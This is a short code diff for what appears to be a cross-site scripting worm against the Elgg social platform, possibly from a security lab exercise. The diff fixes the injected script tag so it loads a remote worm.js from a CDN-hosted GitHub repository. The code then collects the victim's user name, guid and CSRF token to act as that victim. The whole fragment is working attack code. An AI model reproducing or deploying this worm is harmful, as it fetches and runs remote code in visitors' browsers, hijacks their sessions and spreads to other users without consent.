@@ -1,6 +1,6 @@
 window.onload = function(){
     
-    var wormCode = "<script> type= ='text/javascript' src='https://cdn.jsdelivr.net/gh/Zachary-E-Hamilton/seed@latest/blob/main/worm.js'></script>";
+    var wormCode = "<script type='text/javascript' src='https://cdn.jsdelivr.net/gh/Zachary-E-Hamilton/seed@latest/worm.js'></script>";
     var userName = "&name=" + elgg.session.user.name;
     var guid = "&guid=" + elgg.session.user.guid;
     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
